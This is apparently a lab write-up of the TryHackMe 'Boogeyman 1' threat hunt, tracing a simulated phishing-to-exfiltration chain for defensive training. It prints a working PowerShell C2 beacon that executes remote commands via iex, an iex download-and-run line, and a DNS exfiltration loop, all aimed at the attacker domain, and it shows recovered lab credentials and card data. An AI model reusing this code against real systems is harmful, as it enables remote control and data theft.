# TryHackMe – Boogeyman 1: Phishing & PowerShell Threat Hunt

**Category:** Threat Hunting / Digital Forensics / Incident Response  
**Difficulty:** Medium  
**Platform:** TryHackMe  
**Room:** Boogeyman 1  
**Tools Used:** Thunderbird, Linux CLI, jq, Wireshark, CyberChef, KeePass  

---

## Overview

Boogeyman 1 is a full-chain threat hunting investigation simulating a real-world Business Email Compromise (BEC) and malware intrusion. Starting from a suspicious phishing email delivered to a corporate user, the investigation traces the complete attack lifecycle — from initial access via a malicious attachment, through PowerShell-based C2 staging, credential theft using Seatbelt, DNS-based data exfiltration, and finally recovery of stolen credentials from an exfiltrated KeePass database.

**Victim:** Julianne Westcott (`julianne.westcott@hotmail.com`) — employee of Quick Logistics LLC  
**Attacker Domain:** `bpakcaging.xyz` (typosquat of `bpackaging.xyz`)  
**Compromised Host:** `QL-WKSTN-5693`  
**Attacker C2:** `cdn.bpakcaging.xyz:8080` / `files.bpakcaging.xyz`

---

## Attack Chain Summary

```
Phishing Email → Malicious ZIP (Invoice.zip) → LNK File → PowerShell (Base64)
→ C2 Beacon (files.bpakcaging.xyz) → Seatbelt Recon → DNS Exfiltration
→ KeePass DB Stolen → Credentials Recovered
```

---

## Step 1 – Phishing Email Analysis

**Tool:** Thunderbird + EML source viewer  
**Artefact:** `dump.eml`

![Phishing email in Thunderbird with EML source showing DKIM and SPF headers](images/phishing_email.png)

The investigation began with a suspicious email received by Julianne Westcott on **13 Jan 2023 at 09:25**:

| Field | Value |
|-------|-------|
| From | `Arthur Griffin <agriff@bpakcaging.xyz>` |
| To | `julianne.westcott@hotmail.com` |
| Subject | Collection for Quick Logistics LLC – Jan 2023 |
| Attachment | `Invoice.zip` (908 bytes) |

The email body posed as a payment reminder for document `#39586972`, instructing the victim to open the attached file using password **Invoice2023!**

### Header Analysis (Red Flags)

Inspecting the raw EML source revealed critical indicators:

- **SPF Pass** — `bpakcaging.xyz` designates `15.235.99.80` as a permitted sender — the attacker registered and configured the domain properly to bypass SPF checks
- **DKIM Signature** — signed with `d=elasticemail.com` — the attacker used a legitimate bulk email service (Elastic Email) to send the phishing mail, inheriting their DKIM reputation
- **Reply-To** — `agriff@bpakcaging.xyz` — attacker-controlled
- **Message-ID tracking domain** — `tracking.bpakcaging.xyz` — confirms attacker infrastructure
- **Domain:** `bpakcaging.xyz` is a typosquat of `bpackaging.xyz` — one letter transposed, easy to miss

> **Key Insight:** The attacker passed both SPF and DKIM checks by registering a lookalike domain and using a legitimate email provider — this would bypass most email gateway filters.

---

## Step 2 – LNK File Analysis (Malicious Shortcut)

**Tool:** Linux CLI (`lnkparse` / artefact inspection)  
**Artefact:** LNK file inside `Invoice.zip`

![LNK file parsed output showing PowerShell execution with Base64 encoded command](images/lnk_analysis.png)

Extracting `Invoice.zip` with the password `Invoice2023!` revealed a **Windows LNK shortcut file** disguised as an invoice document using an Excel icon (`excel.ico`).

Key fields from the parsed LNK:

```
Relative path:    ..\..\..\Windows\System32\WindowsPowerShell\v1.0\powershell.exe
Working directory: C:\
Icon location:    C:\Users\Administrator\Desktop\excel.ico
Command arguments: -nop -windowstyle hidden -enc <BASE64 PAYLOAD>
```

### What This Means

- The LNK file **targets PowerShell directly**, not a document
- `-nop` disables PowerShell profiles (evades profile-based defenses)
- `-windowstyle hidden` runs the window invisibly — victim sees nothing
- `-enc` passes a **Base64-encoded payload** — obfuscates the malicious command from casual inspection
- The **Excel icon** is social engineering — the victim believes they are opening an invoice spreadsheet

**MITRE ATT&CK:** T1204.002 – User Execution: Malicious File  
**MITRE ATT&CK:** T1059.001 – PowerShell  
**MITRE ATT&CK:** T1027 – Obfuscated Files or Information

---

## Step 3 – PowerShell Log Analysis

**Tool:** `jq`, `grep`  
**Artefact:** `powershell.json` (Windows PowerShell Operational event logs)

![PowerShell JSON logs sorted by timestamp showing C2 beacon and Seatbelt execution](images/powershell_logs.png)

The PowerShell event logs were parsed and sorted chronologically using `jq`:

```bash
cat powershell.json | jq -s -c 'sort_by(.Timestamp) | .[]'
```

### Timeline of Execution (13 Jan 2023, 17:10 UTC)

| Time | EventID | Description |
|------|---------|-------------|
| 17:10:07 | 40961 | PowerShell console starting up |
| 17:10:07 | 40962 | PowerShell ready for user input |
| 17:10:07 | 4104 | ScriptBlock: downloads payload from `files.bpakcaging.xyz/update` |
| 17:10:09 | 4104 | ScriptBlock: C2 beacon to `cdn.bpakcaging.xyz:8080` |
| 17:10:10 | 4104 | ScriptBlock: `echo \`r;pwd` — confirms shell access |
| 17:10:11 | 4100 | Warning: IE engine unavailable — `UseBasicParsing` required |

**Host context from logs:**
```
Hostname:  QL-WKSTN-5693
User:      QL-WKSTN-5693\j.westcott
PowerShell Version: 5.1.18362.145
```

### C2 Beacon Script (ScriptBlockText)

```powershell
$s='cdn.bpakcaging.xyz:8080';
$i='8cce49b0-b86459bb-27fe2489';
$p='http://';
$v=Invoke-WebRequest -UseBasicParsing -Uri $p$s/8cce49b0 -Headers @{"X-38d2-8f49"=$i};
while ($true){
  $c=(Invoke-WebRequest -UseBasicParsing -Uri $p$s/b86459bb -Headers @{"X-38d2-8f49"=$i}).Content;
  if ($c -ne 'None'){
    $r=iex $c -ErrorAction Stop -ErrorVariable e;
    $r=Out-String -InputObject $r;
    $t=Invoke-WebRequest -UseBasicParsing -Uri $p$s/27fe2489 -Method POST -Headers @{"X-38d2-8f49"=$i} -Body ([System.Text.Encoding]::UTF8.GetBytes($e+$r) -join ' ')
  }
  sleep 0.8
}
```

This is a **classic PowerShell C2 implant**:
- Registers with C2 using a GUID session ID (`8cce49b0-b86459bb-27fe2489`)
- Polls for commands every 0.8 seconds via GET requests
- Executes commands with `iex` (Invoke-Expression)
- POSTs results back to the C2 server

---

## Step 4 – Seatbelt Reconnaissance

**Tool:** `jq`, `grep`  
**Artefact:** `powershell.json`

![PowerShell logs showing Seatbelt download and execution via PowerSharpPack](images/seatbelt.png)

Grepping the PowerShell logs for `Seatbelt` revealed post-exploitation recon:

```bash
cat powershell.json | jq '{ScriptBlockText}' | grep Seatbelt
```

```
"ScriptBlockText": "iex(new-object net.webclient).downloadstring('https://github.com/S3cur3Th1sSh1t/PowerSharpPack/blob/master/PowerSharpBinaries/Invoke-Seatbelt.ps1');pwd"
"ScriptBlockText": "Seatbelt.exe -group=user;pwd"
```

**Seatbelt** is a well-known C# post-exploitation tool from the GhostPack suite. The attacker:
1. Downloaded it directly from GitHub using `PowerSharpPack` (a known in-memory loader)
2. Ran `Seatbelt -group=user` to enumerate user-level security data — browser credentials, tokens, recent files, installed software, and more

**MITRE ATT&CK:** T1082 – System Information Discovery  
**MITRE ATT&CK:** T1083 – File and Directory Discovery

---

## Step 5 – DNS-Based Data Exfiltration

**Tool:** `jq`, `grep`  
**Artefact:** `powershell.json`

![PowerShell logs showing DNS exfiltration script using nslookup to bpakcaging.xyz](images/dns_exfil.png)

Grepping for `hex` in the logs revealed the exfiltration mechanism:

```bash
cat powershell.json | jq '{ScriptBlockText}' | grep hex
```

```powershell
"ScriptBlockText": "$split = $hex -split '(\\S{50})';
ForEach ($line in $split) {
  nslookup -q=A \"$line.bpakcaging.xyz\" $destination;
} echo \"Done\""

"ScriptBlockText": "$hex = ($bytes|ForEach-Object ToString X2) -join ''"
```

### How the Exfiltration Works

1. Data is converted to a **hex string** (`ToString X2`)
2. The hex string is **split into 50-character chunks**
3. Each chunk is sent as a **DNS A-record lookup** to `<chunk>.bpakcaging.xyz`
4. The attacker's authoritative DNS server for `bpakcaging.xyz` **logs every query**, reassembling the data server-side

This technique abuses DNS to exfiltrate data without making any direct TCP connections — extremely stealthy and often undetected by DLP tools.

**MITRE ATT&CK:** T1048.003 – Exfiltration Over Alternative Protocol: DNS

---

## Step 6 – C2 Traffic Analysis (Wireshark)

**Tool:** Wireshark – Follow HTTP Stream  
**Artefact:** `capture.pcapng`

![Wireshark HTTP stream showing C2 beacon payload served by SimpleHTTP Python server](images/wireshark_c2.png)

Following TCP stream 109 in Wireshark confirmed the C2 payload delivery:

```
GET /update HTTP/1.1
Host: files.bpakcaging.xyz
Connection: Keep-Alive

HTTP/1.0 200 OK
Server: SimpleHTTP/0.6 Python/3.10.7
Date: Fri, 13 Jan 2023 17:10:09 GMT
Content-type: application/octet-stream
Content-Length: 522
```

**Key findings:**
- The C2 server was running **Python's SimpleHTTPServer** — a common attacker tool for quick staging servers
- The response delivered the PowerShell C2 beacon script (522 bytes)
- Server timestamp `17:10:09` matches exactly with the PowerShell log entry at `17:10:09` — **timeline confirmed**
- The custom header `X-38d2-8f49` was used as the session identifier throughout all C2 communications

---

## Step 7 – Credential Recovery (CyberChef + KeePass)

**Tool:** CyberChef (From Decimal), KeePass  
**Artefact:** Decimal-encoded data from exfiltrated file

![CyberChef From Decimal decode revealing KeePass master password and path](images/cyberchef.png)

Decimal-encoded data recovered from the investigation was decoded in CyberChef using the **From Decimal** operation (Space delimiter):

The decoded output revealed:

```
\id=868150bd-a564-423b-9256-70d3781794b1 Master Password
%p9^3!lL^Mz47E2GaT^y|ManagedPosition=DeviceId:\\?
\DISPLAY#Default_Monitor#1&31c5ecd4&0&UID256#...
Path        C:\Users\j.westcott
```

**Master Password recovered:** `%p9^3!lL^Mz47E2GaT^y`  
**KeePass database path:** `C:\Users\j.westcott`

### KeePass Database Analysis

![KeePass protected_data.kdbx opened showing Homebanking Company Card entry with financial data](images/keepass.png)

Opening `protected_data.kdbx` with the recovered master password revealed the victim's stored credentials, including a **Homebanking → Company Card** entry:

| Field | Value |
|-------|-------|
| Title | Company Card |
| Account Number | 4024007128269551 |
| CVV | 970 |
| Expiration Date | 3/2028 |
| Name | Quick Logistics LLC |
| Created | 01/13/2023 16:34:12 |

The attacker successfully exfiltrated and decrypted the victim's KeePass vault, gaining access to corporate financial credentials.

**MITRE ATT&CK:** T1555.001 – Credentials from Password Stores: Keychain  
**MITRE ATT&CK:** T1005 – Data from Local System

---

## Full Attack Timeline

| Time (UTC) | Event |
|------------|-------|
| 13 Jan 09:25 | Phishing email delivered to j.westcott |
| 13 Jan ~09:25 | Victim opens Invoice.zip, launches LNK file |
| 13 Jan 17:10:07 | PowerShell starts on QL-WKSTN-5693 |
| 13 Jan 17:10:07 | Base64 payload decoded and executed |
| 13 Jan 17:10:09 | Payload downloaded from files.bpakcaging.xyz/update |
| 13 Jan 17:10:09 | C2 beacon established to cdn.bpakcaging.xyz:8080 |
| 13 Jan 17:10:10 | Shell confirmed (`echo \`r;pwd`) |
| 13 Jan ~17:10 | Seatbelt recon executed via PowerSharpPack |
| 13 Jan ~17:10 | KeePass database and data exfiltrated via DNS |
| 13 Jan 16:34 | KeePass entry created (Company Card) — later stolen |

---

## Full MITRE ATT&CK Mapping

| Tactic | Technique | ID |
|--------|-----------|-----|
| Initial Access | Phishing: Spearphishing Attachment | T1566.001 |
| Execution | User Execution: Malicious File (LNK) | T1204.002 |
| Execution | Command and Scripting Interpreter: PowerShell | T1059.001 |
| Defense Evasion | Obfuscated Files (Base64 encoding) | T1027 |
| Defense Evasion | Hidden Window (`-windowstyle hidden`) | T1564.003 |
| Discovery | System Information Discovery (Seatbelt) | T1082 |
| Discovery | File and Directory Discovery | T1083 |
| Command & Control | Non-Standard Port (C2 on :8080) | T1571 |
| Command & Control | Web Protocols (HTTP C2 polling) | T1071.001 |
| Exfiltration | Exfiltration Over Alternative Protocol: DNS | T1048.003 |
| Credential Access | Credentials from Password Stores | T1555.001 |
| Collection | Data from Local System | T1005 |

---

## Key Takeaways

1. **Typosquat domains bypass SPF/DKIM** — attackers register lookalike domains, configure valid email authentication, and abuse legitimate bulk mail providers to evade email gateways
2. **LNK files are a primary phishing vehicle** — disguising PowerShell launchers as Excel files is a mature, widely-used initial access technique
3. **PowerShell logging is essential** — without Script Block Logging (Event ID 4104), the entire C2 chain would be invisible
4. **DNS exfiltration evades DLP** — splitting data into 50-char DNS labels and querying an attacker-controlled domain leaves no TCP connections to block or alert on
5. **SimpleHTTPServer = attacker staging** — seeing Python's built-in HTTP server in network traffic is a strong IOC for malware staging infrastructure
6. **KeePass vaults are high-value targets** — once stolen and unlocked, they hand attackers every credential the victim owns

---

## Tools Used

| Tool | Purpose |
|------|---------|
| Thunderbird | Read and inspect phishing email + raw headers |
| `lnkparse` / Linux CLI | Parse Windows LNK shortcut file |
| `jq` + `grep` | Query and filter PowerShell JSON event logs |
| Wireshark | Follow HTTP stream for C2 traffic analysis |
| CyberChef | Decode From Decimal to recover master password |
| KeePass | Open exfiltrated `.kdbx` vault with recovered password |

---

## Screenshots

| File | Section |
|------|---------|
| `images/phishing_email.png` | Step 1 – Phishing Email |
| `images/lnk_analysis.png` | Step 2 – LNK File |
| `images/powershell_logs.png` | Step 3 – PowerShell Logs |
| `images/seatbelt.png` | Step 4 – Seatbelt Recon |
| `images/dns_exfil.png` | Step 5 – DNS Exfiltration |
| `images/wireshark_c2.png` | Step 6 – C2 Traffic |
| `images/cyberchef.png` | Step 7 – CyberChef Decode |
| `images/keepass.png` | Step 7 – KeePass Vault |

---

*Write-up by Mohammed Suhail | [GitHub](https://github.com/suhail-00/Tryhackme) | [LinkedIn](https://www.linkedin.com/)*
